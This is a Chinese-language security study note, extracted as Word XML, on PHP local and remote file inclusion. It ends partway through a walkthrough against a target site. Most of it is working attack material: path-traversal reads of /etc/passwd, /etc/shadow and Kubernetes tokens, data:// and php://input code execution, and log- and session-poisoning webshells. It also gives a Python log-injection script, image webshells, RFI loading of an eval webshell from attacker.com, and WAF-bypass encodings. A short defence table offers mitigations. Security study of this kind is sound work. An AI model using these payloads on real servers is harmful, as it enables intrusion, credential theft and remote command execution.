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文件操作之文件包含漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>学习笔记 · 从原理到实战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一、漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 什么是文件包含漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>文件包含漏洞是 Web 安全中一类高危漏洞。PHP 中使用 `include()` / `require()` 等函数动态加载文件时，如果传入的文件路径参数可被用户控制且未做充分过滤，就可能导致攻击者读取敏感文件或执行恶意代码。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 分类</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**LFI（Local File Inclusion）**：包含服务器本地文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**RFI（Remote File Inclusion）**：包含远程文件（需 `allow_url_include=On`）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.3 核心函数（PHP）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宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>函数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b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>特性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`include()`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文件不存在时发出警告，继续执行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`require()`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文件不存在时致命错误，停止执行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`include_once()`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只包含一次，避免重复定义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`require_once()`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只包含一次，避免重复定义</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.4 漏洞产生的条件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**脚本**：存在 `include()` / `require()` 动态包含</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**检测**：用户可控的路径参数未做充分过滤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**利用**：可读取敏感文件或执行远程代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**类型**：LFI 或 RFI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二、LFI 本地文件包含</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 本地敏感文件泄露</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>攻击者通过路径穿越读取服务器上已有的敏感文件。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>// 漏洞代码</w:t>
        <w:br/>
        <w:t>$page = $_GET['page'];</w:t>
        <w:br/>
        <w:t>include($page . '.php');</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 攻击 Payload</w:t>
        <w:br/>
        <w:t>?page=../../../../etc/passwd</w:t>
        <w:br/>
        <w:t>?page=../../../../windows/win.ini</w:t>
        <w:br/>
        <w:t>?page=../../../../etc/shadow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**可读取的敏感文件**：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宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>文件路径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`/etc/passwd`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Linux 用户列表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`/etc/shadow`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Linux 密码哈希（需 root 权限）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`/var/www/html/config.php`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数据库配置文件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`/proc/self/environ`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环境变量，可能泄露敏感信息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`/proc/self/cmdline`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进程启动参数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`C:/Windows/System32/drivers/etc/hosts`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Windows 域名解析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`C:/inetpub/wwwroot/web.config`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IIS 配置文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 PHP 伪协议利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**php://filter（读取文件源码）**：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>// Base64 编码输出，绕过 PHP 解析</w:t>
        <w:br/>
        <w:t>?page=php://filter/convert.base64-encode/resource=config.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 嵌套过滤器</w:t>
        <w:br/>
        <w:t>?page=php://filter/convert.base64-encode|convert.base64-encode/resource=index.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 读取不存在的文件，触发错误泄露路径</w:t>
        <w:br/>
        <w:t>?page=php://filter/resource=nonexistent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**data://（代码执行，需 allow_url_include=On）**：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>// 直接在 URL 中执行 PHP 代码</w:t>
        <w:br/>
        <w:t>?page=data://text/plain,&lt;?php%20system('id');?&gt;</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Base64 编码版</w:t>
        <w:br/>
        <w:t>?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**php://input（POST 数据执行，需 allow_url_include=On）**：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>// POST 请求</w:t>
        <w:br/>
        <w:t>?page=php://input</w:t>
        <w:br/>
        <w:t>Body: &lt;?php system('id');?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**expect://（命令执行，需安装 expect 扩展）**：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?page=expect://id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三、日志注入（经典 GetShell 无需上传）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>这是最经典的"无需上传文件"的 LFI 利用方式。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>服务器会把 HTTP 请求的 User-Agent、访问路径、Referer 等信息记录到日志文件中。攻击者将恶意 PHP 代码写入日志，再通过 LFI 包含日志文件触发执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**步骤1：向日志写入恶意代码**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># 在 User-Agent 中写入 PHP 代码</w:t>
        <w:br/>
        <w:t>curl -A "&lt;?php system($_GET['cmd']);?&gt;" http://target.com/</w:t>
        <w:br/>
        <w:br/>
        <w:t># 访问不存在的路径，让路径被记录</w:t>
        <w:br/>
        <w:t>curl "http://target.com/&lt;?php system($_GET['cmd']);?&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**步骤2：通过 LFI 包含日志文件**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># Apache (Debian/Ubuntu)</w:t>
        <w:br/>
        <w:t>?page=../../../var/log/apache2/access.log&amp;cmd=id</w:t>
        <w:br/>
        <w:br/>
        <w:t># Apache (RHEL/CentOS)</w:t>
        <w:br/>
        <w:t>?page=../../../var/log/httpd/access_log&amp;cmd=whoami</w:t>
        <w:br/>
        <w:br/>
        <w:t># Nginx</w:t>
        <w:br/>
        <w:t>?page=../../../var/log/nginx/access.log&amp;cmd=ls</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 常见日志路径汇总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宋体" w:hAnsi="宋体"/>
                <w:b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>系统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b/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>日志路径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Apache (Debian/Ubuntu)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`/var/log/apache2/access.log`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Apache (RHEL/CentOS)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`/var/log/httpd/access_log`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Nginx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`/var/log/nginx/access.log`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SSH 认证日志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`/var/log/auth.log`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系统日志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/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>`/var/log/syslog` / `/var/log/messages`</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 日志注入自动化脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>import requests</w:t>
        <w:br/>
        <w:br/>
        <w:t>target = "http://target.com/"</w:t>
        <w:br/>
        <w:t>lfi_path = "../../../var/log/apache2/access.log"</w:t>
        <w:br/>
        <w:t>cmd = "id"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 写入恶意代码到日志</w:t>
        <w:br/>
        <w:t>requests.get(target, headers={"User-Agent": "&lt;?php system($_GET['cmd']);?&gt;"})</w:t>
        <w:br/>
        <w:br/>
        <w:t># 通过 LFI 执行命令</w:t>
        <w:br/>
        <w:t>r = requests.get(f"{target}index.php?page={lfi_path}&amp;cmd={cmd}")</w:t>
        <w:br/>
        <w:t>print(r.text)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四、Session 文件投毒</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>利用 PHP 的 Session 机制，把恶意代码写入服务器本地的 Session 文件中。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>PHP Session 默认存储在 `/tmp/sess_[SESSION_ID]` 文件中。如果攻击者可以控制 Session 中的某个值（如 `$_SESSION['username']`），该值会被写入 Session 文件。通过 LFI 包含这个 Session 文件即可触发代码执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 步骤</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># 1. 访问目标获取 SESSION_ID（如 PHPSESSID=abc123）</w:t>
        <w:br/>
        <w:t># 2. 在可控参数中写入恶意代码</w:t>
        <w:br/>
        <w:t>curl -b "PHPSESSID=abc123" "http://target.com/?username=&lt;?php system($_GET['cmd']);?&gt;"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3. 通过 LFI 包含 Session 文件</w:t>
        <w:br/>
        <w:t>?page=../../../tmp/sess_abc123&amp;cmd=id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五、配合文件上传 GetShell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>利用网站文件上传功能（如头像上传）制作图片马，再通过 LFI 包含执行。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 制作图片马</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># Linux</w:t>
        <w:br/>
        <w:t>echo -e "\xFF\xD8\xFF\xE0&lt;?php system($_GET['cmd']);?&gt;" &gt; shell.jpg</w:t>
        <w:br/>
        <w:br/>
        <w:t># Windows</w:t>
        <w:br/>
        <w:t>copy normal.jpg /b + shell.php /a shell.jpg</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 LFI 包含</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?page=../../uploads/avatar/shell.jpg&amp;cmd=id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六、RFI 远程文件包含</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 必要条件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>PHP 配置 `allow_url_include = On`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:ind w:left="567"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>PHP 配置 `allow_url_fopen = On`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 基础利用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>攻击者在自己的公网服务器上放置恶意文件：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># shell.txt 内容</w:t>
        <w:br/>
        <w:t>&lt;?php @eval($_POST['password']); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># 攻击请求</w:t>
        <w:br/>
        <w:t>?page=http://attacker.com/shell.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>成功后可用蚁剑（AntSword）或菜刀连接，目录直接暴露。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.3 即时命令执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># cmd.txt 内容</w:t>
        <w:br/>
        <w:t>&lt;?php system($_GET['c']); ?&gt;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># 攻击请求</w:t>
        <w:br/>
        <w:t>?page=http://attacker.com/cmd.txt&amp;c=whoami</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>效果：直接在浏览器 URL 中执行系统命令，相当于获得"浏览器里的终端"。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.4 后缀拼接绕过</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>很多开发者会加后缀：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>include($_GET['page'] . '.php');</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**绕过方法**：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绕过方式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Payload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原理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`?` 截断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`?page=http://attacker.com/shell.txt?`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`?` 后内容被当作 Query String，文件系统只认 `shell.txt`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`#` 截断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`?page=http://attacker.com/shell.txt%23`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`#` 后内容被当作锚点，PHP 底层文件流会忽略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`%00` 截断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`?page=http://attacker.com/shell.txt%00`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仅 PHP &lt; 5.3.4 有效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路径长度截断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`?page=../../../../../../../etc/passwd././././...`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Windows 260 字符 / Linux 4096 字符限制</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>[!] `?` 是最通用、最稳定的绕过方式，`#` 在 URL 中容易被编码，`%00` 仅适用旧版 PHP。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七、现代绕过与进阶技术</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.1 PHP Zip 包装器</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>// 先上传合法 zip 文件（内含 PHP 文件）</w:t>
        <w:br/>
        <w:t>// 使用 zip:// 包含</w:t>
        <w:br/>
        <w:t>?page=zip://shell.zip%23shell.php</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.2 Phar 反序列化</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>// 即使只有 file_exists() 也能触发反序列化</w:t>
        <w:br/>
        <w:t>?page=phar://test.phar/test.txt</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.3 编码绕过 WAF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>// 大小写混淆</w:t>
        <w:br/>
        <w:t>?page=PHP://FILTER/convert.base64-encode/resource=config.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 路径混淆</w:t>
        <w:br/>
        <w:t>?page=....//....//....//etc/passwd</w:t>
        <w:br/>
        <w:t>?page=..\\/..\\/..\\/etc/passwd</w:t>
        <w:br/>
        <w:br/>
        <w:t>// 双重 URL 编码</w:t>
        <w:br/>
        <w:t>?page=%25%32%66etc%25%32%66passwd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.4 容器环境文件包含</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># Docker 容器日志路径</w:t>
        <w:br/>
        <w:t>/var/log/containers/</w:t>
        <w:br/>
        <w:t>/var/log/pods/</w:t>
        <w:br/>
        <w:br/>
        <w:t># K8s 内部敏感文件</w:t>
        <w:br/>
        <w:t>/var/run/secrets/kubernetes.io/serviceaccount/token</w:t>
        <w:br/>
        <w:t>/var/run/secrets/kubernetes.io/serviceaccount/namespace</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>7.5 利用 /proc/self 环境信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>?page=../../../proc/self/environ</w:t>
        <w:br/>
        <w:t>?page=../../../proc/self/fd/X</w:t>
        <w:br/>
        <w:t>?page=../../../proc/self/cmdline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八、防护方案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防御措施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代码示例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**白名单路径**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只允许包含特定文件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`$allowed = ['home.php','about.php']; if(!in_array($page,$allowed)) die();`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**禁用远程包含**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关闭危险配置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`allow_url_include = Off`, `allow_url_fopen = Off`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**路径规范化**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过滤路径穿越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`if(strpos(realpath($path),$base_dir) !== 0) die();`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**禁用危险函数**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评估是否必须用 include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改用路由分发或 MVC 框架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**WAF 规则**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拦截路径遍历和伪协议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检测 `../`, `php://`, `data://`, `expect://`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**日志文件隔离**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日志文件放在 Web 目录外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禁止 Web 用户读 /var/log/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>[!] **最安全的做法**：不使用用户输入作为文件路径，改用白名单索引（如 `?page=home` 对应 `include('pages/home.php')`）。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九、总结</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>[!] 文件包含核心 = 用户控制路径 + include() 执行。LFI 可泄露敏感文件或配合日志注入/伪协议达成 RCE，RFI 可直接远程执行且可利用 `?` 绕过后缀拼接。防御 = 白名单路径 + 禁用远程包含 + 路径规范化。无需上传时日志投毒、Session 投毒是最经典的"零文件"利用方式。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>实战案例：从 LFI 到内网维</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>场景描述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>某目标站点 `www.target.com` 是一个新闻发布系统，URL 格式为 `index.php?page=news`。通过修改 page 参数发现存在本地文件包含漏洞。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>阶段一：发现与探测</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**发现**：修改 page 参数观察页面变化。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># 正常访问</w:t>
        <w:br/>
        <w:t>http://www.target.com/index.php?page=news</w:t>
        <w:br/>
        <w:t># 返回：新闻页面内容</w:t>
        <w:br/>
        <w:br/>
        <w:t># 尝试路径穿越</w:t>
        <w:br/>
        <w:t>http://www.target.com/index.php?page=../../../etc/passwd</w:t>
        <w:br/>
        <w:t># 返回：root:x:0:0:root:/root:/bin/bash</w:t>
        <w:br/>
        <w:t># daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</w:t>
        <w:br/>
        <w:t># -&gt; 存在 LFI 漏洞！</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>**探测**：确认包含方式和过滤情况。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t># 测试后缀拼接</w:t>
        <w:br/>
        <w:t>http://www.target.com/index.php?page=../../../etc/passwd</w:t>
        <w:br/>
        <w:t># 返回 passwd 内容 -&gt; 没有后缀拼接</w:t>
        <w:br/>
        <w:br/>
        <w:t># 测试 PHP 伪协议</w:t>
